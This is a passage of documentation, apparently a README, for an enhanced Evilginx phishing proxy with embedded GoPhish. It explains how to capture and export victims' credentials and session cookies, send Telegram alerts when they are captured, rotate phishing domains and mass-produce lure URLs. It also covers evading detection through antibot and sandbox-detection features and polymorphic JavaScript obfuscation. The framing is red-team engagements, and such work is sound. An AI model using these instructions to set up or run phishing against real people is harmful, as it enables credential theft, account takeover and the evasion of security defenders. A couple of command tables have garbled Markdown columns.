GET /api/sessions/export?has_creds=true

# Sessions captured after a Unix timestamp
GET /api/sessions/export?since=1700000000
```

**Audit log** — all admin actions are recorded:

```bash
# View last 200 audit entries
GET /api/audit?limit=200
```

### Telegram Notifications

Real-time alerts can be sent directly to your Telegram bot whenever credentials or cookies are captured.

- Enable via: `config telegram enabled true`
- Test configuration: `config telegram test`

### GoPhish Integration

GoPhish is **embedded directly inside the Evilginx binary** — it is not a separate process or install. It starts automatically alongside Evilginx and runs on `127.0.0.1:3333` (localhost only).

**How it works:**

- When a lure is created (`lures create`), Evilginx auto-provisions a GoPhish campaign, landing page, email template, and target group.
- When a victim submits credentials, Evilginx records the event in GoPhish's SQLite database (`~/.evilginx/gophish.db`) with IP address, user-agent, submitted form data, and geolocation (MaxMind GeoLite2).
- Results are viewable in the GoPhish dashboard and via the Evilginx WebAPI at `/api/gophish/campaigns/results`.

**First-time login:**
The auto-generated admin password is printed to stdout when Evilginx first starts. Override it before starting via environment variables:

```bash
export GOPHISH_INITIAL_ADMIN_PASSWORD="YourStrongPassword"
export GOPHISH_INITIAL_ADMIN_API_TOKEN="your-32-char-api-token-here"
sudo evilginx-start
```

**Accessing the dashboard remotely (SSH tunnel required):**

The dashboard binds to localhost only and has no TLS. Access it via an SSH tunnel from your operator machine:

```bash
ssh -L 3333:127.0.0.1:3333 root@YOUR_VPS_IP
# Then open http://localhost:3333 in your browser
# Login: admin / <password printed at startup>
```

**Auto-created SMTP profile:**

The auto-provisioned SMTP profile points to `localhost:25` with a placeholder sender. To actually send phishing emails from GoPhish, configure a real SMTP provider in the GoPhish dashboard under **Sending Profiles**.

**`config gophish` commands — note on scope:**

```bash
config gophish admin_url <url>    # For future external GoPhish (not used by native integration)
config gophish api_key <key>      # For future external GoPhish (not used by native integration)
config gophish test               # Confirms native integration is active
```

> **Note:** `admin_url` and `api_key` are configuration stubs for a planned external-instance mode. The native embedded integration does **not** use them — it accesses the GoPhish database directly in-process.

### Bind Address

By default Evilginx listens on all interfaces using the external IP set via `config ipv4`. To bind to a specific local interface instead:

```bash
config ipv4 external YOUR_PUBLIC_IP   # external IP announced to targets
config ipv4 bind YOUR_LOCAL_IP        # local interface to bind sockets to
```

### Cloudflare Tunnel Setup (Admin Panel Remote Access)

Cloudflare Tunnel (`cloudflared`) exposes the admin panels publicly over HTTPS without opening firewall ports or requiring a static IP. Two subdomains are created:

| Subdomain             | Target           | Purpose                   |
| --------------------- | ---------------- | ------------------------- |
| `admin.YOUR_DOMAIN`   | `localhost:2030` | Web Admin API / Dashboard |
| `gophish.YOUR_DOMAIN` | `localhost:3333` | GoPhish Dashboard         |

**Prerequisites:**

- Domain already added to Cloudflare and using Cloudflare nameservers
- Cloudflare account with API access

**Option A — During full installation (prompted at end):**

```bash
TUNNEL_DOMAIN=example.com sudo ./install.sh
# Answer 'y' when asked about Cloudflare Tunnel at the end
```

**Option B — Standalone tunnel setup only:**

```bash
# Run after Evilginx is already installed
TUNNEL_DOMAIN=example.com sudo ./install.sh --tunnel

# Or run the dedicated setup script directly
TUNNEL_DOMAIN=example.com sudo bash setup-tunnel.sh
```

**Environment variables for automation (skip interactive prompts):**

```bash
TUNNEL_DOMAIN=example.com          # Required — your Cloudflare-managed domain
CF_TUNNEL_NAME=evilginx-panels     # Tunnel name (default: evilginx-panels)
CF_TUNNEL_ADMIN_SUB=admin          # Admin subdomain prefix (default: admin)
CF_TUNNEL_GOPHISH_SUB=gophish      # GoPhish subdomain prefix (default: gophish)
```

**What the setup does (automated):**

1. Installs `cloudflared` from GitHub releases (detects amd64/arm64)
2. Opens browser login to authenticate with Cloudflare
3. Creates a named tunnel and retrieves its ID
4. Writes `/etc/cloudflared/config.yml` with ingress rules
5. Creates DNS CNAME records automatically via `cloudflared tunnel route dns`
6. Installs and starts `cloudflared` as a systemd service (auto-starts on boot)

**Verify tunnel is running:**

```bash
systemctl status cloudflared
journalctl -u cloudflared -f          # Live logs

cloudflared tunnel list               # Show all tunnels and status
cloudflared tunnel info evilginx-panels
```

**Troubleshooting:**

```bash
# Tunnel not starting — check credentials file path
cat /etc/cloudflared/config.yml

# Re-authenticate if cert.pem is missing or expired
cloudflared tunnel login

# DNS not resolving — check CNAME records in Cloudflare dashboard
# They should point to <TUNNEL_ID>.cfargotunnel.com

# Restart after config changes
systemctl restart cloudflared
```

**Remove tunnel:**

```bash
# Via uninstaller (prompts)
sudo ./install.sh --uninstall

# Or manually
systemctl stop cloudflared && systemctl disable cloudflared
cloudflared service uninstall
cloudflared tunnel delete evilginx-panels
rm -rf /etc/cloudflared ~/.cloudflared
```

> **Security:** Add Cloudflare Access policies to restrict who can reach these subdomains.
> Dashboard → Zero Trust → Access → Applications

---

## 13. Operational Security

1. **Infrastructure Isolation**: Never reuse campaign infrastructure. Use fresh VPS and Domains for each engagement.
2. **Access Control**: The installer offers to create a dedicated admin user and disable root SSH login. Use it.
3. **Least Privilege**: The Evilginx service runs as a restricted `evilginx` user, not root. If exploited, the blast radius is limited.
4. **Data Handling**: Exfiltrate captured session tokens securely and destroy data on the VPS after the engagement.

---

## 14. Troubleshooting

### Issue: "Port 443 already in use"

```bash
sudo lsof -i :443
# Kill the process or stop the service
```

### Issue: Certificates not generating

- Verify DNS propagation (`dig A login.yourdomain.com`).
- Disable conflicting services (nginx/apache).
- Try `config autocert off` for debugging.

### Issue: "lures can't read turnstile data"

- This is often harmless (browser requesting icons/manifests). The automated installer includes default files to minimize this.

### Issue: Sessions not capturing

- Run in debug mode: `./build/evilginx -debug -p ./phishlets` to see raw traffic logs.

### Issue: "port check failed: bind: permission denied"

- This means the process cannot bind to a privileged port (53, 80, or 443).
- **Fix 1**: Grant port-binding capability: `sudo setcap 'cap_net_bind_service=+ep' /usr/local/bin/evilginx`
- **Fix 2**: Run the automated installer (`sudo ./install.sh`), which sets capabilities automatically.
- **Fix 3**: Use high ports via config: `config https_port 8443`, `config dns_port 5353`.

---

## 15. Command Reference

### General Configuration

| Command          | Usage                                            | Description                                                                               |
| :--------------- | :----------------------------------------------- | :---------------------------------------------------------------------------------------- | -------- | --------------- |
| **`config`**     | `config`                                         | Show all configuration variables.                                                         |
|                  | `config ipv4 external <ipv4_address>`            | Set the public IPv4 address announced to targets.                                         |
|                  | `config ipv4 bind <ipv4_address>`                | Set the local interface IP to bind sockets to (defaults to external).                     |
|                  | `config unauth_url <url>`                        | Set redirect URL for unauthorized requests.                                               |
|                  | `config autocert <on\|off>`                      | Enable/disable automatic Let's Encrypt certificates.                                      |
|                  | `config lure_strategy <strategy>`                | Set lure URL strategy (`short`, `medium`, `long`, `realistic`, `hex`, `base64`, `mixed`). |
|                  | `config gophish admin_url <url>`                 | Set GoPhish admin API URL.                                                                |
|                  | `config gophish api_key <key>`                   | Set GoPhish API key.                                                                      |
|                  | `config gophish test`                            | Test the GoPhish API connection.                                                          |
|                  | `config telegram bot_token <token>`              | Set Telegram bot token for notifications.                                                 |
|                  | `config telegram chat_id <id>`                   | Set Telegram chat ID to receive notifications.                                            |
|                  | `config telegram enabled <true\|false>`          | Enable or disable Telegram notifications.                                                 |
|                  | `config telegram test`                           | Send a test Telegram notification.                                                        |
|                  | `config http_port <port>`                        | Set the HTTP proxy port.                                                                  |
|                  | `config https_port <port>`                       | Set the HTTPS proxy port.                                                                 |
|                  | `config dns_port <port>`                         | Set the DNS server port.                                                                  |
|                  | `config redirectors_dir <path>`                  | Set directory where redirector HTML files are stored.                                     |
|                  | `config post_redirectors_dir <path>`             | Set directory where post-redirector HTML files are stored.                                |
| **`proxy`**      | `proxy`                                          | Show proxy configuration.                                                                 |
|                  | `proxy enable`, `proxy disable`                  | Enable/disable upstream proxy.                                                            |
|                  | `proxy type <http                                | https                                                                                     | socks5>` | Set proxy type. |
|                  | `proxy address <address>`, `proxy port <port>`   | Configure proxy endpoint.                                                                 |
|                  | `proxy username <user>`, `proxy password <pass>` | Configure proxy auth.                                                                     |
| **`test-certs`** | `test-certs`                                     | Test availability of set up TLS certificates for active phishlets.                        |
| **`clear`**      | `clear`                                          | Clear the terminal screen.                                                                |

### Phishlets & Lures

| Command         | Usage                                                                          | Description                                                                                                                                            |
| :-------------- | :----------------------------------------------------------------------------- | :----------------------------------------------------------------------------------------------------------------------------------------------------- |
| **`phishlets`** | `phishlets`                                                                    | Show status of all available phishlets.                                                                                                                |
|                 | `phishlets <name>`                                                             | Show details of a specific phishlet.                                                                                                                   |
|                 | `phishlets create <template> <name> <params...>`                               | Create a child phishlet from a template with custom params.                                                                                            |
|                 | `phishlets delete <name>`                                                      | Delete a child phishlet.                                                                                                                               |
|                 | `phishlets hostname <name> <host>`                                             | Set hostname for a phishlet (e.g. `login.evilsite.com`).                                                                                               |
|                 | `phishlets unauth_url <name> <url>`                                            | Override global unauth_url just for this phishlet.                                                                                                     |
|                 | `phishlets enable <name>`                                                      | Enable phishlet and request SSL/TLS certificates.                                                                                                      |
|                 | `phishlets disable <name>`                                                     | Disable phishlet.                                                                                                                                      |
|                 | `phishlets hide <name>`, `unhide <name>`                                       | Toggle visibility (hidden state logs requests but doesn't serve page).                                                                                 |
|                 | `phishlets get-hosts <name>`                                                   | Generate hosts file entries for local testing.                                                                                                         |
| **`lures`**     | `lures`                                                                        | Show all created lures.                                                                                                                                |
|                 | `lures create <phishlet>`                                                      | Create a new lure for a phishlet.                                                                                                                      |
|                 | `lures get-url <id> [params...]`                                               | Generate a phishing URL for a lure.                                                                                                                    |
|                 | `lures get-url <id> import <params_file> export <urls_file> <text\|csv\|json>` | Generate bulk phishing URLs from an import text file and export them.                                                                                  |
|                 | `lures pause <id> <duration>`                                                  | Pause a lure for a specific duration (e.g., `1d2h`) and redirect visitors to `unauth_url`.                                                             |
|                 | `lures unpause <id>`                                                           | Unpause a lure.                                                                                                                                        |
|                 | `lures edit <id> <field> <value>`                                              | Edit lure properties (`hostname`, `path`, `redirect_url`, `phishlet`, `info`, `og_title`, `og_desc`, `og_image`, `og_url`, `ua_filter`, `redirector`). |
|                 | `lures delete <id>`, `lures delete all`                                        | Delete one or more lures.                                                                                                                              |

### Sessions & Data

| Command        | Usage                                         | Description                                       |
| :------------- | :-------------------------------------------- | :------------------------------------------------ |
| **`sessions`** | `sessions`                                    | Show history of captured sessions.                |
|                | `sessions <id>`                               | Show detailed session info (tokens, credentials). |
|                | `sessions delete <id>`, `sessions delete all` | Delete captured session data.                     |
|                | `sessions export <id>`                        | Export captured session data to a JSON file.      |

### Domain Management

| Command       | Usage                                                                       | Description                                                                           |
| :------------ | :-------------------------------------------------------------------------- | :------------------------------------------------------------------------------------ |
| **`domains`** | `domains`                                                                   | Show base domain, domain pool, and rotation status.                                   |
|               | `domains set <domain>`                                                      | Set the base domain for all phishlets.                                                |
|               | `domains list`                                                              | List all configured domains with status and primary flag.                             |
|               | `domains add <domain> [description]`                                        | Add a new domain to the multi-domain pool.                                            |
|               | `domains remove <domain>`                                                   | Remove a domain from the pool.                                                        |
|               | `domains set-primary <domain>`                                              | Set which domain is the primary domain.                                               |
|               | `domains enable <domain>`                                                   | Enable a domain for use.                                                              |
|               | `domains disable <domain>`                                                  | Disable a domain (keeps it in pool but inactive).                                     |
|               | `domains rotation`                                                          | Show domain rotation configuration.                                                   |
|               | `domains rotation enable <on\|off>`                                         | Enable or disable automatic domain rotation (auto-populates from configured domains). |
|               | `domains rotation strategy <round-robin\|weighted\|health-based\|random>`   | Set rotation strategy.                                                                |
|               | `domains rotation interval <minutes>`                                       | Set rotation interval in minutes.                                                     |
|               | `domains rotation max-domains <count>`                                      | Set maximum number of domains in pool.                                                |
|               | `domains rotation auto-generate <on\|off>`                                  | Enable or disable automatic domain generation.                                        |
|               | `domains rotation list`                                                     | List all domains in the rotation pool.                                                |
|               | `domains rotation add-provider <name> <type> <api_key> <api_secret> <zone>` | Add a DNS provider for domain rotation.                                               |
|               | `domains rotation mark-compromised <domain> <reason>`                       | Mark a domain as compromised and remove from rotation.                                |
|               | `domains rotation stats`                                                    | Show detailed rotation statistics.                                                    |

### Defense & Evasion

| Command         | Usage                               | Description                                                                                          |
| :-------------- | :---------------------------------- | :--------------------------------------------------------------------------------------------------- | --------------------------------------------------------- |
| **`blacklist`** | `blacklist <mode>`                  | Set mode: `all` (block everything), `unauth` (block unauthorized), `noadd` (stop adding ips), `off`. |
|                 | `blacklist log <on                  | off>`                                                                                                | Toggle blacklist logging.                                 |
|                 | `blacklist list`                    | List all blacklisted IP addresses.                                                                   |
|                 | `blacklist add <ip>`                | Manually add an IP address to the blacklist.                                                         |
|                 | `blacklist remove <ip>`             | Remove an IP address from the blacklist.                                                             |
|                 | `blacklist clear`                   | Remove all IP addresses from the blacklist.                                                          |
| **`whitelist`** | `whitelist <on                      | off>`                                                                                                | Enable/disable IP whitelist (blocks all non-whitelisted). |
|                 | `whitelist add <ip>`, `remove <ip>` | Manage allowed IPs.                                                                                  |
| **`antibot`**   | `antibot enabled <true\|false>`     | Enable/disable unified antibot protection.                                                           |
|                 | `antibot action <block\|spoof>`     | Set action on detection: block connection or serve spoofed content.                                  |
|                 | `antibot spoof_url <url>`           | URL to fetch content from when action is 'spoof'.                                                    |
|                 | `antibot threshold <0.0-9.9>`       | Set ML detection confidence threshold.                                                               |
|                 | `antibot override_ips list`         | List IPs that bypass antibot detection.                                                              |
|                 | `antibot override_ips add <ip>`     | Add IP to whitelist (bypasses antibot checks).                                                       |
|                 | `antibot override_ips remove <ip>`  | Remove IP from antibot whitelist.                                                                    |

#### `antibot ja3` — JA3/JA3S TLS Fingerprinting

| Usage                                             | Description                                                                     |
| :------------------------------------------------ | :------------------------------------------------------------------------------ |
| `antibot ja3`                                     | Show basic JA3 fingerprinting statistics.                                       |
| `antibot ja3 stats`                               | Show detailed JA3 capture and detection statistics.                             |
| `antibot ja3 signatures`                          | List all known bot JA3 signatures with name, hash, confidence, and description. |
| `antibot ja3 add <name> <ja3_hash> <description>` | Add a custom bot JA3 signature (hash must be 32-char MD5).                      |
| `antibot ja3 export`                              | Export all JA3 signatures to a timestamped JSON file.                           |

#### `antibot captcha` — CAPTCHA Protection

| Usage                                                                         | Description                                                                      |
| :---------------------------------------------------------------------------- | :------------------------------------------------------------------------------- |
| `antibot captcha`                                                             | Show current CAPTCHA configuration and provider status.                          |
| `antibot captcha enable <on\|off>`                                            | Enable or disable CAPTCHA protection.                                            |
| `antibot captcha provider <name>`                                             | Set active CAPTCHA provider (e.g. `turnstile`, `recaptcha_v3`, `hcaptcha`).      |
| `antibot captcha configure <provider> <site_key> <secret_key> [key=value...]` | Configure a CAPTCHA provider with site key, secret key, and optional parameters. |
| `antibot captcha require <on\|off>`                                           | Require CAPTCHA verification for all lures.                                      |
| `antibot captcha test`                                                        | Display test page URL for verifying CAPTCHA integration.                         |

#### `antibot sandbox` — Sandbox / VM Detection

| Usage                                                | Description                                                       |
| :--------------------------------------------------- | :---------------------------------------------------------------- |
| `antibot sandbox`                                    | Show current sandbox detection configuration and statistics.      |
| `antibot sandbox enable <on\|off>`                   | Enable or disable sandbox detection.                              |
| `antibot sandbox mode <passive\|active\|aggressive>` | Set detection aggressiveness level.                               |
| `antibot sandbox threshold <0.0-1.0>`                | Set detection confidence threshold.                               |
| `antibot sandbox action <block\|redirect\|honeypot>` | Set action upon detecting a sandbox or VM.                        |
| `antibot sandbox redirect <url>`                     | Set redirect URL when action is 'redirect'.                       |
| `antibot sandbox honeypot <html>`                    | Set honeypot HTML response when action is 'honeypot'.             |
| `antibot sandbox stats`                              | Show detailed sandbox detection statistics and detection methods. |

> **Note:** Domain rotation has been moved to `domains rotation`. See the [Domain Management](#domain-management) section above for all rotation commands.

#### `antibot traffic-shaping` — Traffic Shaping / Rate Limiting

| Usage                                                                          | Description                                                                                           |
| :----------------------------------------------------------------------------- | :---------------------------------------------------------------------------------------------------- |
| `antibot traffic-shaping`                                                      | Show current traffic shaping configuration and metrics.                                               |
| `antibot traffic-shaping enable <on\|off>`                                     | Enable or disable traffic shaping.                                                                    |
| `antibot traffic-shaping mode <adaptive\|strict\|learning>`                    | Set shaping mode.                                                                                     |
| `antibot traffic-shaping global-limit <rate> <burst>`                          | Set global request rate limit (requests/s) and burst size.                                            |
| `antibot traffic-shaping ip-limit <rate> <burst>`                              | Set per-IP request rate limit (requests/s) and burst size.                                            |
| `antibot traffic-shaping bandwidth-limit <bytes/sec>`                          | Set global bandwidth limit in bytes per second.                                                       |
| `antibot traffic-shaping geo-rule <country> <rate> <burst> <priority> <block>` | Add geographic rate-limiting rule (country = 2-letter code, block = true/false).                      |
| `antibot traffic-shaping stats`                                                | Show detailed traffic statistics: requests, rate-limited, DDoS blocked, bandwidth, geographic blocks. |

#### `antibot polymorphic` — Polymorphic JavaScript Engine

| Usage                                                    | Description                                                                                                                        |
| :------------------------------------------------------- | :--------------------------------------------------------------------------------------------------------------------------------- |
| `antibot polymorphic`                                    | Show current polymorphic engine configuration and mutation statistics.                                                             |
| `antibot polymorphic enable <on\|off>`                   | Enable or disable dynamic code mutation.                                                                                           |
| `antibot polymorphic level <low\|medium\|high\|extreme>` | Set level of code obfuscation.                                                                                                     |
| `antibot polymorphic cache <on\|off\|clear>`             | Enable, disable, or clear the mutation cache.                                                                                      |
| `antibot polymorphic seed-rotation <minutes>`            | Set seed rotation interval in minutes (0 = no rotation).                                                                           |
| `antibot polymorphic template-mode <on\|off>`            | Enable or disable template-based mutations.                                                                                        |
| `antibot polymorphic mutation <type> <on\|off>`          | Toggle a specific mutation type: `variables`, `functions`, `deadcode`, `controlflow`, `strings`, `math`, `comments`, `whitespace`. |
| `antibot polymorphic test [code]`                        | Test polymorphic mutations on sample JavaScript code (generates 3 variants).                                                       |
| `antibot polymorphic stats`                              | Show detailed engine statistics: total mutations, unique variants, cache hits, and hit rate.                                       |

### Infrastructure & Traffic

| Command          | Usage                                               | Description                                                         |
| :--------------- | :-------------------------------------------------- | :------------------------------------------------------------------ |
| **`cloudflare`** | `cloudflare config`                                 | Show current Cloudflare Worker configuration.                       |
|                  | `cloudflare config account_id <id>`                 | Set the Cloudflare account ID.                                      |
|                  | `cloudflare config api_token <token>`               | Set the Cloudflare API token.                                       |
|                  | `cloudflare config zone_id <id>`                    | Set the Cloudflare zone ID (optional).                              |
|                  | `cloudflare config subdomain <subdomain>`           | Set the workers.dev subdomain.                                      |
|                  | `cloudflare config enabled <true\|false>`           | Enable or disable Cloudflare Worker deployment.                     |
|                  | `cloudflare config test`                            | Test the Cloudflare API credentials.                                |
|                  | `cloudflare worker <type> <redirect_url> [options]` | Generate a Cloudflare Worker script (`simple`, `html`, `advanced`). |
|                  | `cloudflare deploy <name> <type> <url> [options]`   | Deploy a worker directly to Cloudflare.                             |
|                  | `cloudflare list`                                   | List all deployed workers.                                          |
|                  | `cloudflare delete <worker_name>`                   | Delete a deployed worker.                                           |
|                  | `cloudflare update <worker_name> <url>`             | Update a worker's redirect URL.                                     |
|                  | `cloudflare status <worker_name>`                   | Check a worker's deployment status.                                 |
